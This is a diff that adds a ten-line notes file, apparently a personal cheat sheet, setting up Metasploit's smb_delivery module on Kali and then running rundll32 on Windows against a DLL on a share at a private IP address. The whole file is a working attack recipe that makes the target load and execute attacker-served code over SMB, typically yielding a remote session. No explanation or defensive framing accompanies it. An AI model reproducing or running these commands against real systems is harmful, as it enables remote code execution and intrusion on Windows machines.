@@ -1,0 +1,10 @@
+ON KALI:
+msfconsole
+use exploit/windows/smb/smb_delivery
+set FILENAME 1.dll
+set FOLDER_NAME 2
+set SHARE 3
+exploit
+
+ON WINDOWS:
+rundll32 \\172.16.217.130\3\2\1.dll,0
